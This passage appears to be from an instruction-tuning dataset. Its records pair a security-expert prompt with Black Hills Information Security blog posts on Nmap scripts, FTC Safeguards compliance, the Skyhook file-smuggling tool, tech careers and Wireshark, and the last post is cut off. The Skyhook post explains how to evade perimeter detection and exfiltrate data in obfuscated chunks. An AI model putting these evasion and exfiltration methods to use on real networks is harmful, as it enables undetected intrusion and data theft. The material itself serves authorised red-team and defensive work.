of scan -T4 Aggressive scan -T4 will reduce the time for a scan to complete and should be used if you have a fast and reliable connection -oX filepath filename and type output results into an XML file I recommend saving your Nmap output into files that can be referenced later in the engagement The -oX option will save the output in XML format Saving in XML will allow you to easily parse through the results This parsing is helpful when you are looking for hosts with specific ports open like SQL or SMB -sC script scan Pentesters use a wide variety of specialized tools however some may be unaware that the same task can be accomplished with an additional Nmap script Using Nmap scripts is quick and efficient With the Nmap Scripting Engine NSE users can utilize a collection of scripts with various purposes like discovering additional details about an open port and protocol to further enumeration and brute forcing Below are a few Nmap scripts and their descriptions These are scripts I use regularly You can find a full list of available scripts here map.org nsedoc scripts sshv1 Checks if an SSH server supports the obsolete and less secure SSH Protocol Version 1 DHCP discover Sends a DHCPINFORM request to a host on UDP 67 to obtain all the local configuration parameters without allocating a new address ftp-anon Checks if an FTP server allows anonymous logins ftp-brute Performs brute force password auditing against FTP servers http-enum Enumerates directories used by popular web applications and servers http-passwd Checks if a webserver is vulnerable to directory traversal by attempting to retrieve etc passwd or boot ini http-methods Finds out what options are supported by an HTTP server by sending an OPTIONS request ms-sql-info Attempts to determine configuration and version information for Microsoft SQL server instances mysql-enum Performs valid-user enumeration against MySQL server using a bug NSF-showmount Shows NFS exports like the showmount -e command rdp-enum-encryption Determines which encryption level is supposed by the RDP service smb-enum-shares Attempts to list shares tftp-enum Enumerates TFTP filenames by testing for a list of common ones Nmap is a Swiss army knife and can substitute some of your favorite tools when you're in a pinch There are even more Nmap scripts to explore and use For more information related to Nmap check out their dedicated site and their GitHub ithub.com nmap nmap for information on contributing to the project"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Why Do Car Dealers Need Cybersecurity Services?</title>\n<taxonomies>Informational, InfoSec 101, Tom Smith, Compliance, FTC, Incident Response, penetration testing, Safeguard Rule</taxonomies>\n<creation_date>Thu, 08 Jun 2023 19:13:32 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Tom Smith At Black Hills Information Security BHIS we deal with all manner of clients public and private Until a month or two ago though we'd never dealt with a car dealership But in the past few weeks we've spoken to several dealerships What's up Turns out that the US Federal Trade Commission FTC has ruled that auto dealers are now subject to the Gramm-Leach-Bliley Safeguard Rule As of June 9 2023 the rule applies to car dealers The purpose of the Rule is to require financial institutions to take steps to ensure the security of consumer data they possess What's new is the fact that car dealerships in possession of 5 000 or more potential customer records are now considered financial institutions If you've been in business for any length of time and sell more than a few cars a month you're subject to the new rules But what do you have to do to be in compliance Nothing more than follow basic industry best practices for data security implement an Information Security program to safeguard customer data Section 314.4 outlines what your Information Security program must contain There are nine requirements You must Designate a Qualified Individual to oversee the program This person can be an employee a contractor or a vendor Base the program on a written risk assessment The risk assessment should include an honest evaluation of the adequacy of your current security posture Implement controls to mitigate the risks identified In most cases the expectation is that Multi-Factor Authentication is in place for all systems Evaluate the effectiveness of your controls through penetration testing Require that any third-party vendors you work with comply with sound security practices Keep your Information Security Program up to date as your technology posture changes and especially in light of results of the penetration testing described above Maintain a written Incident Response IR Plan An IR Plan outlines steps to be taken in the case of a data breach or other data security incident Have the Qualified Individual report status to senior leadership on at least an annual basis Those institutions not in compliance are subject to fines levied by the FTC If you're an auto dealer dipping into cybersecurity for the first time as a result of these new rules your head may be swimming Just remember that these are basic industry security practices that all but the smallest businesses are beginning to roll out As such free and low-cost resources to help organizations such as yours are plentiful BHIS can help Some related BHIS content Making Compliance Suck Less John Strand BHIS Nuggets YouTube AASLR Intro to Tabletop Exercises IR Playbook Fun Non-Denominational Winter Holiday Version YouTube If you have further questions around compliance feel free to reach out to consulting blackhillsinfosec.com Further reading Safeguards Rule FTC Safeguards Rule What Your Business Needs to Know Federal Trade Commission FTC Safeguards Rule NADA"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Evasive File Smuggling with Skyhook</title>\n<taxonomies>External/Internal, How-To, Informational, Justin Angel, Exfil</taxonomies>\n<creation_date>Thu, 15 Jun 2023 13:20:00 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "ImposterKeanu Introduction This blog post introduces the reader to The Obfuscation Hustle a term I enjoy using to describe the tedious process of obfuscating and delivering files to corporate workstations defended by signature-based perimeter controls Skyhook a new open-source tool available on GitHub is then introduced and demonstrated as a viable method of eliminating two non-negligible steps of The Hustle while also providing obfuscated file exfiltration functionality Be Advised Skyhook Isn't a Privacy Tool Readers may be tempted to view Skyhook through privacy-tinted glasses due to the use of encryption algorithms to obfuscate data Don't An encryption algorithm is only as effective as its implementation and these have been implemented by an idiot Keys are displayed in plaintext at various points in web interfaces and they're currently stored in the clear in client-side IndexedDB Anyone with access to these elements can easily recover data from packet captures or staged file chunks Readers should also avoid confusing Skyhook's round-trip obfuscation cycle with end-to-end encryption E2EE E2EE intends to assure that data is recoverable only by entities with the encryption keys where Skyhook does the opposite it obfuscates data long enough to be smuggled past controls and then deobfuscates it before writing it to disk Plaintext in plaintext out Concisely Skyhook does not enhance confidentiality of transferred files beyond fooling to perimeter controls Context The Obfuscation Hustle BHIS approach to remote access for post-compromise scenarios generally involves working with customers to establish RDP access to an internal workstation over a BHIS-maintained VPN tunnel This approach provides a secure and reliable method of accessing the network to execute the engagement Since operators are acting in the context of a standard user on a workstation derived from a customer's golden image beacon shell will not be immediately available to facilitate encrypted file transfers Files will have to be transferred using alternative methods that are likely scrutinized by TLS intercepting Intrusion Detection and Prevention Systems IDPS implemented to block suspicious traffic These conditions lead operators to encoding and or encrypting files prior to transit thereby obfuscating their content and evading detection While generally effective this approach creates burdensome overhead for operators Each newly retrieved file must be deobfuscated to become useful again Complicating matters further is that once deobfuscated on a workstation files are likely to be exposed Endpoint Detection and Response EDR which depending on the contents of the file may result in it being quarantined and defenders receiving alerts Defense in depth has entered the chat Two stages of obfuscation for a given file prior to transit is often effective in this scenario one for EDR and a second for IDPS Inspired by Sean Metcalf's Credential Shuffle I like to call this The Obfuscation Hustle For instance the process of manually Hustling a Snaffler binary to a corporate workstation may look roughly like the flowchart below Note that Skyhook intends to automate the network filtering obfuscation and host for download stages The Obfuscation Hustle Download Introducing Skyhook Skyhook was developed to cut the manual nonsense out of applying obfuscation to bypass network-based controls An HTTP S file server is used to seamlessly read plaintext files from disk and serve them to clients in obfuscated chunks Each chunk passes through a series of pipelined algorithms called obfuscators that alter the content in transit In addition to the file content file listings and names are passed through the same chain to prevent leakage We can observe how the Skyhook approach obfuscates file chunks in the following screenshot which was borrowed from the subsequent section that outlines general usage of Skyhook As you can see each critical element of the HTTP transaction is encrypted and Base64 encoded in that order Burp Inspecting an HTTP Transaction that Requests a File Chunk Also keep in mind that Skyhook's web interface is also capable of performing obfuscated file uploads When this occurs JavaScript reads a given file in slices and obfuscates each one before sending them to the server in an HTTP transaction Each chunk is then received by the server deobfuscated and inserted into the destination file The Skyhook Service Architecture During the early planning stages of development we decided that we wanted to make Skyhook as configurable as possible while minimizing operator learning curve Web interfaces were chosen as the best method but we also wanted to make sure that account and obfuscation configurations could not be easily inspected To accommodate this approach we decided that the Skyhook binary should simultaneously run two HTTPS services that are exposed through React web interfaces The Admin Service Used to manage accounts and apply obfuscation configurations Distinct from the transfer interface to ensure secret values aren't exposed to defenders Should be accessed only from friendly sources devices i.e those free of defender controls Also generates links to the transfer interface which is convenient since paths are generally randomized The Transfer Service Accessed by operators from unfriendly sources devices i.e those monitored by defenders User-level credentials should be used to access this service Used to stream files to and from a server-side web root directory Obfuscation algorithms are implemented in web assembly allowing the following algorithms written in go to be compiled for use in web browsers AES Base64 Blowfish Twofish XOR IndexedDB is used to store obfuscated downloaded file chunks The following diagram illustrates the basic dataflow of this architecture Data Flow Diagram We recommend deploying Skyhook with offense in depth in mind Internally we deploy Skyhook to a container stack and expose the file transfer server through CDNs Skyhook's web root is populated in a pair of CICD pipelines one that dynamically obfuscates common C tooling and a second that consumes raw shellcode to produce enhanced payloads This approach provides value to operators by compartmentalizing capabilities and minimizing manual keyboard labor The Admin Service The admin service exists to provide operators with a clean method of managing the configuration file without having to concern themselves with YAML shenanigans Know that this is little more than a glorified YAML editor Any changes made here result in updates to the configuration file itself Operators are dropped to the User Accounts functionality after authentication which can be used to add and remove accounts as needed Admin Service User Configurations Clicking the Obfuscators button in the interface reveals the current obfuscation configuration An obfuscator is a configured obfuscation algorithm The listing will be empty by default but know that Skyhook will always apply a single round of base64 encoding before writing the response body This is a safety mechanism to ensure the obfuscation chain doesn't produce arbitrary byte sequences that could potentially break HTTP transactions Admin Interface Obfuscators Configuration Currently Empty Obfuscators can be initialized by clicking the Add button and selecting the desired algorithm A form will appear that accepts the necessary inputs Click Save after adjusting the configurations to put them into enforcement Just be sure that no file transfers are in process otherwise failure is imminent Admin Service Adding an XOR Obfuscator It's overkill but we always have the option of chaining algorithms together by adding and reordering them accordingly Just know that each stage is going to add processing overhead so recovering the files from JavaScript will be memory heavy and slow The final feature of the admin interface is a simple Quick Copy Button which generates links to the transfer service These links will contain the dynamically generated paths created when the config file was derived by Skyhook's creation command along with encryption keys for the JS loader which we'll touch more on later Admin Interface Quick Copy Links Clicking any of these buttons will result in the referenced link being copied to your clipboard so that operators don't have to reference the configuration file Convenience The File Transfer Service This section is dedicated to demonstrating general usage of the Skyhook transfer service with an emphasis on how obfuscation is applied to various elements of HTTP transactions See Appendix A Recreating the Demo Environment to access a demo Docker container that can be used to recreate a similar environment for testing Logging into the web interface offered by the transfer service results in a listing of the web root being rendered Remember that links pointing to randomized paths are available in the admin service Transfer Interface Logging In A file listing of the web root is rendered upon authentication revealing directories and files to interact with Initial File Listing Changing to the demo-data directory reveals files that can be downloaded Transfer Interface File Listing Using Burp to inspect the HTTP transactions that loaded the interface into the browser we can clearly see the authentication POST request to login and a PATCH request to a longer URI ending in a base64 encoded parameter The latter of the two effectively represents a REST call to list the contents of the web root directory This can be confirmed by decoding the parameter and observing the true value of demo-data Note Obfuscators were not configured for this transaction so only Base64 encoding was applied Burp Inspecting Obfuscated Directory Listing Transaction Single-round Base64 encoding isn't particularly evasive Luckily Skyhook offers four additional obfuscation methods that can be chained together in random ordering AES XOR Blowfish Twofish Adding a XOR obfuscator and setting the key to secret will encrypt the above content along with file data Admin Service Adding an XOR Obfuscator The client must sync its obfuscation config to continue interacting with the service otherwise it will fail to deobfuscate output Inspecting the same directory listing transaction after XOR encryption is applied reveals that the data is no longer recoverable by simply Base64 decoding the values Synchronizing the Obfuscation Config Burp Inspecting File Listing Request Things're Encrypted Just click Download on a file and the interface will begin retrieving it from the server in chunks 1MB by default as shown below when the 100M.data file was downloaded The browser will prompt the user to save the file when all chunks have been stored and the file has been reassembled File Transfer Interface Downloading 100M.data Inspecting a single transaction that retrieved a file chunk we can see that key elements of the HTTP request are obfuscated Burp Inspecting a File Chunk Here is an MD5 hash to demonstrate that integrity of the file was maintained after the chunked and obfuscated download process The MD5 fingerprint prefixed to each file name was not generated by Skyhook It was a byproduct of the skyhook-demo container MD5 Hash Proof Uploading large files is as simple and effective as downloading them Just click the Browse button in the transfer service interface to select and upload a file Inspecting a chunked upload request allows us to confirm that all values are encrypted as well File Transfer Interface Uploading a File Gigabyte File Burp Inspecting a File Upload Chunk Conclusion The Hustle is a frustrating impediment to operator efficiency during early stages of post-compromise scenario engagements Skyhook has been introduced as a potential method of minimizing hustle by automating two steps of the process application of obfuscation algorithms and file hosting Skyhook's utility is enhanced further by offering upload capabilities that can be used to facilitate obfuscated file exfiltration As Skyhook was made available to the public only a few days before releasing this blog post it's difficult to ascertain effectiveness of the underlying obfuscation techniques when faced with well-configured detection capabilities Regardless BHIS operators have reported zero incidents of detection by IDPS or other network-based controls during the handful of engagements it has been used for This is expected to change should Skyhook become a regularly used utility Appendix A Recreating The Demo Environment I intentionally avoided illustrating how the demo environment was configured for the sake of brevity but a demo container is available to quickly demo Skyhook's capabilities Assuming Docker is installed this command should start the container for use Burp can be configured to inspect various requests for inspection but know that large response bodies will likely make it fall into convulsions Also I recommend using a Chrome-based browser right now as Firefox is behaving flakily with the web assembly Docker Command to Start the Demo Container The above command will start the Skyhook services on localhost Admin Service 27.1 65535 Transfer Service 27.1 8443 Take care to capture the admin credentials from standard out when the container starts otherwise the admin interface will be inaccessible Starting the Demo Container"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Shenetworks' Guide to Landing Your First Tech Job</title>\n<taxonomies>General InfoSec Tips & Tricks, How-To, Informational, InfoSec 101, Serena DiPenti</taxonomies>\n<creation_date>Thu, 20 Jul 2023 16:33:11 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Serena DiPenti ww.youtube.com embed yndjMaRpurc Buckle up for this one because I'm about to give you A LOT of information As someone who works in tech and creates tech content I am aware there is no information shortage on how to get into tech Some of the content is great and helpful and some of it is close to predatory and if you're someone who is unfamiliar with the field it can be difficult to sort the good and bad I would be skeptical of any information coming from someone trying to sell you bootcamps or tech career consulting services I would also look out for people promising big results in a short amount of time People are trying to capitalize on the question that most frequently ends up in my inbox So here is my opinion free of charge I cannot make big promises of a six-figure job at a FAANG company with no experience but I can offer you this resource and what you make of it is totally up to you If all my technical experience was going to be erased from my brain and all I could do was write a guide to myself on how to rebuild my career from scratch this would be it Step One Identify Your Area of Interest Working in tech can mean a thousand different things When I originally picked my degree I did so based off the recommendation of a customer when I was working at Best Buy I didn't do any research on all the different roles educational resources or what I would find the most interesting My biggest concern was who's hiring and if I could make a living with it I went into networking I do not regret it but I do wish I had a better idea of what I was getting myself into before I threw myself into the proverbial deep end Spend time researching different areas of tech like networking systems administration software development data analytics cloud cybersecurity even sales Then once you pick an area that you would like to pursue look at the different options within that field For example working in cybersecurity can include jobs like network security software security penetration testing soc analyst threat hunter malware research incident response digital forensics and cloud security and this isn't even a complete list When I decided I wanted to move into cybersecurity I spent a year looking at different options and speaking with professionals before I made my decision to move into penetration testing Take time to pick but it's ok if you change your mind later Step Two Start the Job Search Start looking at job openings as you get an idea of the roles that interest you I recommend reviewing at least 3 open positions While reviewing each position pay close attention to the job duties and the qualifications Eventually you will start to see patterns Write those down because this is going to give you a good idea of the skills you'll need to obtain one of these positions Two disclaimers first the position you are exploring might not be the first tech job you land it probably won't be You are creating a goal and it might take several steps to reach it Secondly think of the listed qualifications as the company's wish list In most circumstances the requirements and qualifications listed are negotiable and candidates rarely meet every qualification Managers often make exceptions relating to educational requirements and experience with specific technology stacks Keep that in mind when looking at the postings because it might seem a little daunting at first Step Three Revamp Your Resume This step comes after reviewing a variety of open positions because now you know some of the language they use and qualities they're looking for This is the area where people miss opportunities You want to get your resume ready to apply for tech roles which means you need to highlight sought after skills that apply to tech positions You don't need to have any tech specific experience on your resume to do this Here is a list of some examples Working with customers to identify and meet their needs Problem solving Communication Skills Leadership managing a team Project management Collaborating with coworkers Ability to prioritize Coordinating with vendors or business Meeting deadlines Detail oriented Documentation and writing Some companies use automated programs to filter applications meaning your resume may not even be read by a human I created a list of keywords that can help you highlight your skills and hopefully get your resume in the hands of a real human Support Lead Facilitate Ensure Maintain Initiate Implement Manage Coordinate Improve Evaluate Performance Monitor Identify Participate Deliver Resolve Design Analyze Increase Adapt Review Develop Produce Provide Revise Apply Adhere Configure Recommend Enhance Execute Upgrade Install Test Assist Educate Efficient Guide Approve Assign Solve Create Sometimes you must make the system work for you If you are a student at a university or community college find your career center and see if they offer resume services and interview practice I was able to do this at my university and it was completely free Alternatively Harvard and other universities have documents available with resume templates and advice Harvard's is available here wpi.harvard.edu files ocs files hes-resume-cover-letter-guide.pdf I personally use the second resume template in the document Step Four Start Applying for Jobs Start applying for jobs once your resume is ready to be sent off I recommend making a weekly goal such as sending out 3 job applications a week Entry-level jobs can be difficult to identify If you filter for 'entry-level jobs on LinkedIn you'll notice many of the positions require 3-5 years experience or a four-year degree in computer science or similar I still recommend applying for those jobs At worst you won't hear back from them at best you might land it Consider technical positions for your own city or school district they often have positions available for people without much experience and you'll get hands on with a wide variety of vendors equipment and issues These positions can usually be found on your city's or school district's website Also look out for apprenticeship programs like the one offered by Cisco Consistently apply for new roles and take opportunities to interview when available Interview experience is valuable and feedback can help you improve Remember if you don't get a call back or land the job it's ok to apply for opportunities at the company in the future Step Five Beef Up Your Resume While applying for tech jobs you should come up with a plan to add some tech experience to your resume There are many ways to do this and I have outlined a few below College Classes Community College Research your local community college Community colleges often offer discounted or free classes to residents in the area 20 US states offer free tuition for residents The community college closest to my home offers classes to residents for 70 a credit hour Most classes are 3 credit hours making one course 210 For comparison the four-year university 15 minutes away from the community college costs 2 389 per credit hour If financially viable you can enroll in your local community college part time even if just take one class a semester and add that to your resume You are now a student pursuing a technical degree at an accredited learning institution Free College Classes Harvard and MIT both offer free classes to the public You can take Introduction to Computer Science And Programming with MIT Open Courseware or Data Science R Basics through Harvard EDx partners with different universities to offer classes for free in a variety of different fields Some offer a certificate on completion for a cost but you can still list you completed the course even if you didn't purchase the 'official certificate Online Courses Different organizations offer free and low-cost course options Antisyphon Pay What You Can Cybersecurity AWS Educate Cloud Grow with Google Various Cody Academy Development and Data The Linux Foundation Linux Operating Systems FreeCodeCamp Development Cisco Networking Academy Networking Microsoft Learn Various Hands-On Hands-on learning resources and projects are a great way to showcase your knowledge TryHackMe Cybersecurity HackTheBox Cybersecurity Projects Development Work on coding your own project and publish it on GitHub Open-Source Projects Development Once you have some coding experience and have worked on a few small projects on your own try to find and contribute to open-source projects on GitHub Industry Certifications There are many industry certifications available and most of them cost money Some of the most well-known certifications include CompTIA Network CompTIA Security Cisco Certified Network Associate CCNA and AWS Solutions Architect Some employers may require a specific certification for example some government jobs require the Security certification Most companies do not require any certifications but may list it as a preference On occasion there are opportunities to test for these certifications for free For example the Texas Workforce Commission has a program called Skills Enhancement Initiative and offers free training for all Texas residents certification voucher funding for eligible participants and even job referrals There's a lot of conflicting opinions regarding certifications Personally I recommend them for someone who may have no formal higher education or previous industry experience And job recruiters love them A growing list of free learning resources can be found on my GitHub Step Six Network Not the Computer Kind You are applying for jobs and learning now it's time to meet some people in your prospective field People want to hire people they know All the steps previously mentioned are important but this one will yield results Do from home Get active on social media follow and interact with people in the field Attending Virtual Conferences There are tons of conferences you can attend virtually for free Join a Discord Group Discord groups like the BHIS one is a great place to connect with people who have the same interest and offer a friendly space where you can ask questions and get advice This is the best way to get your questions answered quicky Do outside your home Attending in-person conferences Participate in local meetup groups Meetup.com is a great place to look for local events In the Dallas area our local DEF CON group and Dallas Hackers Association meet up every month These groups are a great place to learn and meet local professionals You can get some job leads and make friends Find Mentorship If you're participating in Discord groups and local meetup groups then you will eventually find someone who you could call a mentor Mentorship does not need to be a formal arrangement and comes in many forms Look for mentorship from people you already have a friendly relationship with These are people who have extra time to answer your questions or provide you with feedback Finally Be Consistent All these steps will take time and consistency Don't give up after a month of no results If you notice you aren't getting any results after 6 months ask a mentor if they would be willing to look at your resume or give you some feedback Talk with them about the jobs you're applying for and what you're doing to improve any knowledge gaps on your resume I got my first technical job in 2012 selling computers then my first full-time networking position in 2018 and my first pentesting position in 2022 10 years after I started working with computers Consistency and time for the win Good luck"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Welcome to Shark Week: A Guide for Getting Started with Wireshark and TShark</title>\n<taxonomies>Blue Team, Blue Team Tools, General InfoSec Tips & Tricks, How-To, Incident Response, Informational, InfoSec 101, InfoSec 201, Troy Wojewoda, DFIR</taxonomies>\n<creation_date>Thu, 27 Jul 2023 15:27:15 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Troy Wojewoda In honor of Shark Week1 I decided to write this blog to demonstrate various techniques I've found useful when analyzing network traffic with Wireshark as well as its command-line utility TShark For years Wireshark has been the de facto tool for analyzing captured network traffic It has extensive capabilities to decapsulate break apart the various layers of network traffic enabling analysis of network communication between two hosts Use cases range from troubleshooting network connections to unraveling malicious threats within an environment not to mention countless others in between Remembering back to the first time I ever opened a packet capture for analysis I felt a bit like Marty McFly in Back to the Future II when he encountered the gigantic Jaws hologram Okay maybe not that dramatic but it was intimidating to say the least I do remember staring at the screen thinking I have no idea what I'm even looking at Where do I start Where's the evil What does it all mean If you are brand new to Wireshark this blog won't alleviate all encountered difficulties like a recipe for mastering anything new it takes a lot of time patience practice and more practice Akin to whenever someone asks me How do I get started in incident response My reply Start doing incident response However before we jump into analyzing packets there are a few housekeeping items that are worth mentioning First and foremost make sure you're using the latest version of Wireshark Especially if you're analyzing network traffic from untrusted sources and or points-of-presence i.e raw internet traffic The last thing you need during an incident response investigation is for your analysis machine to become an additional victim Although it's true that Wireshark routinely experiences bugs and vulnerabilities it is still one of the most popularly used network protocol analyzers in the field and although these issues surface from time to time the community that supports this tool addresses them quickly The following wiki article provides more details on this topic iki.wireshark.org Security In short keep your tools up to date and consider utilizing Wireshark from within a virtual environment particularly when performing packet analysis on network traffic captured from untrusted zones Note The current version of Wireshark was 4.0.7 when this article was published Display Formats and Settings In this section I'll cover some of the common display formats and settings encountered with Wireshark Time Display Format Time is one of the most critical components of any investigation so it only makes sense that we start there Wireshark supports several options for displaying the timestamp of a given packet To view or change the Time Display Format navigate from the main toolbar to View Time Display Format Wireshark Time Display Format My preference is the UTC Date and Time of Day 1970-01-01 01 02 03.123456 option One important note to mention about timestamps in packet captures the timestamp is recorded at time of capture by the utility and most likely the system time from which the capture was taken This may be a separate system from your analysis machine altogether so ensure proper time synchronization is in place and routinely audited throughout your environment A good resource on this subject is CISA's guidance2 for managing time settings in an environment Also NIST maintains a list of Internet Time Servers3 that can be used to synchronize time over NTP Network Time Protocol Name Resolutions There are three areas where automatic name resolutions can be performed by Wireshark These settings are accessed from the main toolbar View Name Resolution In the most recent install version 4.0.7 the only setting enabled by default was Resolve Physical Addresses Wireshark Name Resolution Depending on the scenario these automatic resolutions may be helpful to an analyst however they do have the potential to thwart analysis or even lead to OPSEC failures let me explain a little more of what these settings do Resolve Physical Addresses MAC OUI Resolution Wireshark translates the first three octets of a MAC address also known as OUI or Organizationally Unique Identifier to the assigned vendor name Resolve Network Addresses Reverse DNS Resolution Wireshark performs reverse DNS lookups on source destination IP addresses Resolve Transport Addresses TCP UDP Port Association Wireshark associates TCP UDP ports to their assigned application protocols i.e TCP 80 HTTP UDP 53 DNS Resolve Physical Addresses With Resolve Physical Addresses selected Wireshark will translate the OUI first three octets in the MAC address to its assigned vendor As shown in the Packet Details section of a packet below the octets 00 50 56 and 00 0c 29 were both attributed to VMware This aligns with the fact that I used a virtual host to generate packets for testing and performed the capture from a virtual network adapter Wireshark Packet Details Resolved Physical Addresses Resolve Network Addresses With Resolve Network Addresses selected Wireshark will perform reverse DNS lookups on all Source and Destination IP addresses within the capture Although this setting may seem convenient it has the potential to tip-your-hand from an OPSEC perspective especially if you're performing packet capture analysis containing publicly routable IP addresses For demonstration purposes I enabled this setting in Wireshark from within a virtual machine where the guest system was configured in NAT mode I then captured traffic in out of the guest OS while opening a packet capture file the result reverse DNS lookups were observed leaving the guest system The below screen capture shows that Wireshark from within the guest OS was initiating reverse DNS queries for the IP 137.184.39.243 out to a public DNS resolver not shown in the capture Wireshark Packet List Resolved Network Addresses Resolve Transport Addresses With Resolve Transport Addresses selected Wireshark will tag each TCP and UDP port respectively with their commonly associated network protocol For example NTP or Network Time Protocol is commonly associated with both TCP 123 and UDP 123 Wireshark Packet Details Resolved Transport Addresses In the screen capture above we can see in the packet details section where Wireshark tagged the Destination Port as ntp however if we peer into this conversation using the Follow TCP Stream feature we can see that this is not NTP traffic but rather HTTP Wireshark Follow TCP Streams In my opinion the Resolve Physical Addresses this is the least potentially detrimental setting for analysis There are cases where MAC address analysis is part of an investigation and a vendor lookup is helpful The Wireshark community also maintains a website4 to perform bulk OUI lookups which I've found to be very useful from time to time Resolving transport addresses can be misleading especially if you are new to network analysis my advice to anyone considering this feature is to treat it as informational and just be cognizant that anyone with full control of a system can utilize whatever TCP UDP port they please I do this all the time when testing egress controls for clients and it never ceases to amaze me the number of organizations that allow outbound traffic solely on the basis of the TCP UDP port number Analysts should proceed with caution when it comes to the Resolve Network Addresses option Perhaps there are use cases where this feature is value-add however I don't believe the risk is worth the reward and therefore I do not recommend it Display Windows Wireshark uses three windows to display packet information these windows are Packet List The topmost display pane where a high-level summary of each packet is displayed By default Wireshark displays the packet number packet timestamp source destination addresses protocol and description for each packet The column headers can be reordered right or left and or clicked on to sort ascending descending Packet Details The bottom-left pane in older versions the middle pane shows the details of the packet selected Wireshark displays various fields in a hierarchical structure based on the selected packet's TCP IP layers Packet Bytes The bottom-right pane in older versions the lowest pane displays the selected packet's bytes represented in a hex dump with ASCII characters and an offset column also represented in hex The screen capture below shows an example of each display with a packet capture file opened Wireshark Display Windows Note In the screen capture above the display filter toolbar has the 'http filter applied I'll discuss more about display filters in a bit Capture Options If you've been fortunate enough to never experience processing a huge PCAP file with Wireshark consider yourself lucky and when I say huge I'm only talking 500MB Wireshark is an extremely powerful network protocol analyzer but it is often painful to use against large packet captures This next section will cover some techniques to help alleviate these pain points When utilizing Wireshark to capture network traffic we can apply various capture options from both an input and output perspective This helps limit the size of acquired data which in turn aids our ability to analyze the traffic more swiftly To access capture options navigate to Capture Options from the main toolbar Input Limiting the Capture to a Target Host To limit the capture to a target host we can use the following filter syntax host In the example below I'm filtering on the IP address 192.168.232.130 This tells Wireshark to capture traffic where this IP is either the Source or Destination address Wireshark Capture Options Capture Filter You can also view some prebuilt capture filters by selecting Capture Capture Filters from the main toolbar The Filter Expression column contains example syntax for applying each respective filter Wireshark Capture Options Saved Capture Filters Output Limiting the Capture Output If the capture process is going to run for a long or indefinite period it may be best to have Wireshark roll the output to a new file based on some provided criteria The Output section tab provides us with a few options here We can tell Wireshark to save a new file after x-number of packets or bytes have been collected or some defined time derivative Below shows an example where Wireshark is configured to write a new PCAP file each time the captured data hits 100MBs Wireshark Capture Options Output Multiple Files Display Filters Capture Filters Once a packet capture file is opened or otherwise generated with Wireshark display filters can be applied to aid analysis Display filters are different than capture filters in that Capture filters are only applied when capturing live network traffic Display filters can be used during the capture process or when analyzing a saved PCAP file During a live capture Wireshark will continue to capture traffic regardless of any display filter applied a display filter will limit the packets being viewed but Wireshark will continue capturing traffic in the background as defined in the Capture Options Input tab The Display Filter Toolbar is located just above the Packet List window Conveniently Wireshark will populate a dropdown of display filter selections as you type in this field This makes it less likely that an improperly formatted filter gets applied Note Wireshark will highlight the filter toolbar in red if the filter syntax is incomplete invalid Many of the supported Wireshark display filters use a hierarchical syntax represented in dot-notation For example if we want to apply an HTTP-based display filter but wish to be more granular in our selection we can type http directly followed by Wireshark will then list all supported HTTP display filters Wireshark HTTP Filter Options If you're curious to know all built-in supported display filters simply navigate to View Internals Supported Protocols and view the filter column for the desired filter syntax Shown below is just a portion of supported HTTP display filters Wireshark Supported Protocols partial HTTP Listing Wireshark currently supports over 218k display filters from nearly 3k protocols Follow the Streams Viewing packet contents is one of the most powerful capabilities when it comes to network traffic analysis The more context we have the better informed we are during analysis But that may be easier said than done when viewing captured network traffic at a per-packet level Sure we can select each packet and view the packet details and packet bytes sections within Wireshark but that approach doesn't scale well Fortunately Wireshark provides us with the capability to view a given Stream of network traffic Wireshark supports stream analysis over several different protocols for this topic we'll be looking at TCP streams To view a given TCP stream right-click on a TCP packet in the Packet List display and select Follow TCP Stream Wireshark Follow TCP Streams Upon making this selection Wireshark does two things Displays the TCP stream in a new window Client data host that initiated the connection is color-coded in red Server data host that responded to the client request is color-coded in blue Automatically applies a tcp.stream display filter accordingly Wireshark catalogs all streams on initial processing with the first stream identified as Stream 0 As shown in the below screenshot the display filter was tcp.stream eq 3 or in other words the 4th TCP stream in the capture file Wireshark Follow TCP Streams with Auto-Applied Display Filter Extracting Objects There's nothing more satisfying to an incident responder than being able to extract attacker artifacts from network traffic The specific email used as a phish containing URLs and or attachments malicious file downloads exfiltrated data etc etc Fortunately Wireshark has a built-in capability that allows us to extract objects from network traffic Unfortunately Wireshark limits this capability to only a handful of protocols We can see the supported protocols by navigating to File Export Objects Wireshark Supported Protocols for Exporting Objects If you're in a scenario where you have captured traffic containing threat activity there's an opportunity to extract file artifacts for a deeper dive into the content that was transferred over the network To demonstrate I opened a test PCAP file and navigated to File Export Objects 